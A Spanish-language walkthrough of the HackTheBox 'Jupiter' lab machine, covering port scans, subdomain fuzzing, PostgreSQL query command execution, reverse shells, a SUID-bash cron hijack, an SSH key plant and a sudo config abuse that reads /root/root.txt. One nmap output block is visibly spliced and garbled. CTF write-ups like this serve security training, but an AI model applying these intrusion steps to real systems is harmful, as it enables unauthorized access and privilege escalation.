

![1](</Writeups/Machines/Jupiter/img/logo.png>)
By Rug4lo

## Reconocimiento

Primero empezamos con el típico escaneo con nmap
```bash
nmap -p- --open -sS -min-rate 1000 -vvv -n -Pn -oG allPorts 10.10.11.216
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-10 16:22 CEST
Initiating SYN Stealth Scan at 16:22
Scanning 10.10.11.216 [65535 ports]
Discovered open port 22/tcp on 10.10.11.216
Discovered open port 80/tcp on 10.10.11.216
Completed SYN Stealth Scan at 16:22, 34.54s elapsed (65535 total ports)
Nmap scan report for 10.10.11.216
Host is up, received user-set (0.10s latency).
Scanned at 2023-10-10 16:22:17 CEST for 34s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 34.69 seconds
           Raw packets sent: 71835 (3.161MB) | Rcvd: 71834 (2.873MB)
```
Podemos hacer un escaneo mas exhaustivo 
```bash
nmap -sCV -p22,80 10.10.11.216 -oN Targeted 
```
```bash
Nmap scan report for jupiter.htb (10.10.11.216)
Host is up (0.16s latency).

PORT   STATE SERV[65535 ports]
Discovered open port 22/tcp on 10.10.11.216
Discovered open port 80/tcp on 10.10.11.216
Completed SYN Stealth Scan at 16:22, 34.54s elapsed (65535 total ports)
Nmap scan report for 10.10.11.216
Host is up, received user-set (0.10s latency).
Scanned at 2023-10-10 16:22:17 CEST for 34s
Not shown: 65533 clICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA)
|_  256 6001d7db927b13f0ba20c6c900a71b41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Home | Jupiter
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
Viendo que no hay nada interesante iremos a investigar un poco la pagina web

![1](</Writeups/Machines/Jupiter/img/1.png>)

Si buscamos por la pagina no seremos capaces de encontrar nada, pero si nos ponemos a enumerar subdominios, encontraremos uno muy interesante:
```bash
wfuzz -c --hc=403 --hw 12 -t 20 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.jupiter.htb" http://jupiter.htb/
```
```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jupiter.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000001955:   200        211 L    798 W      34390 Ch    "kiosk"                                                                                                                
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
```
Si buscamos por ese subdominio, (recordando que hay que ponerlo en el /etc/hosts), nos encontraremos una pagina bastante interesante

![1](</Writeups/Machines/Jupiter/img/2.png>)

La pagina en si no tiene gran cosa, pero si interceptamos con burpsuite las peticiones de la pagina (la principal) veremos algo interesante:

![1](</Writeups/Machines/Jupiter/img/3.png>)

## Explotación de la query

En esta peticion podemos observar que manda una query por una base de datos **PostgreSQL** por lo que buscando encontré una manera de ejecutar comandos en la query, por lo tanto me mande una reverse shell a mi maquina 

![1](</Writeups/Machines/Jupiter/img/4.png>)

En el otro terminal nos entrara la reverse shell y podremos continuar

![1](</Writeups/Machines/Jupiter/img/5.png>)

## De Postgres a Juno

Ahora hay que escalar a el usuario Juno, para esto, si utilizamos el pspy podremos ver que el usuario juno esta corriendo un .yml en el /dev/shm, podemos modificarlo para que nos cree una bash y le ponga permiso suid en el /temp

![1](</Writeups/Machines/Jupiter/img/6.png>)

Si esperamos un poco nos creara una bash en el tmp, con la que podemos convertirnos en el usuario Juno

![1](</Writeups/Machines/Jupiter/img/7.png>)

Para conectarnos pr ssh podemos irnos a la carpeta .ssh de Juno y pasarle nuestra id_rsa.pub y cambiarle el nombre a authorized_keys

![1](</Writeups/Machines/Jupiter/img/8.png>)

Ahora si entramos por ssh y ya tendremos la user.txt

![1](</Writeups/Machines/Jupiter/img/9.png>)

## De Juno a Jovian

Ahora vamos a mirar los grupos en donde esta este usuario, y vemos el grupo "science"

![1](</Writeups/Machines/Jupiter/img/10.png>)

Si buscamos por archivos que tengan este grupo veremos que en el opt hay varios logs que podemos leer 

![1](</Writeups/Machines/Jupiter/img/11.png>)

Si listamos el mas reciente veremos un token para un servicio interno de la maquina, que se ejecuta en el puerto 8888

![1](</Writeups/Machines/Jupiter/img/12.png>)

Si hacermos un portforwarding con ssh podremos entrara a este servicio desde nuestra maquina
```bash
ssh -L 8888:127.0.0.1:8888 juno@10.10.11.216
```
Si nos metemos en la pagina veremos lo siguiente

![1](</Writeups/Machines/Jupiter/img/13.png>)

Indagando un poco encontramos que tiene un apartado donde podemos ejecutar codigo python (creamos un nuevo documento .ipynb)

Si introducimos una reverse shell ahí podemos ganar acceso como el usuario jovian

![1](</Writeups/Machines/Jupiter/img/14.png>)

Con esto ya tendremos acceso como el usuario Jovian

![1](</Writeups/Machines/Jupiter/img/15.png>)

## De Jovian a root

Ahora si vemos los permisos que tiene este usuario como root encontraremos esto:
```bash
sudo -l
```
```bash 
Matching Defaults entries for jovian on jupiter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jovian may run the following commands on jupiter:
    (ALL) NOPASSWD: /usr/local/bin/sattrack
```

Este usuario puede ejecutar como administrado este binario, el cual si inspeccionamos con el comando strings, encontraremos que ejecuta un config.json
```bash
nano /usr/local/share/sattrack/config.json
```
Podemos copiarnos este archivo al /tmp
```bash
cp config.json /tmp/config.json
```
```bash
chmod +x config.json 
```
Y ahora modificarlo para que nos copie la root flag
```bash
{
	"tleroot": "/tmp/tle/",
	"tlefile": "weather.txt",
	"mapfile": "/usr/local/share/sattrack/map.json",
	"texturefile": "/usr/local/share/sattrack/earth.png",
	
	"tlesources": [
                "file:///root/root.txt"
	],
	
	"updatePerdiod": 1000,
	
	"station": {
		"name": "LORCA",
		"lat": 37.6725,
		"lon": -1.5863,
		"hgt": 335.0
	},
	
	"show": [
	],
	
	"columns": [
		"name",
		"azel",
		"dis",
		"geo",
		"tab",
		"pos",
		"vel"
	]
}
```
Con esto hecho ejecutamos el binario, y esto nos creara una carpeta tle en la cual dentro estará la root.txt

![1](</Writeups/Machines/Jupiter/img/16.png>)